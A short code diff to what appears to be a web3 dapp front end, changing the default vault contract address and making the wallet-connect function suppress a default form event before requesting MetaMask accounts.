@@ -1,4 +1,4 @@
-const VAULT_DEFAULT=`0x9D722b578Ff03791C84F39f0f2F1a78aDd3f9791`;
+const VAULT_DEFAULT=`0x3cb5faCA74f5F0211a1f1a773Ed45B042bDD50C5`;
 const RPC=`https://rpc.bohr.life`;
 const EXPLORER=`https://scan.bohr.life`;
 const CHAIN_ID=0x3c8;
@@ -62,7 +62,8 @@ function erc20(a){
   return new ethers.Contract(a,ERC20_ABI,p);
 }
 
-async function connect(){
+async function connect(e){
+  if(e) e.preventDefault();
   if(!window.ethereum){ log(`no wallet found, use MetaMask`); return; }
   const accs=await window.ethereum.request({method:`eth_requestAccounts`});
   account=accs[0];
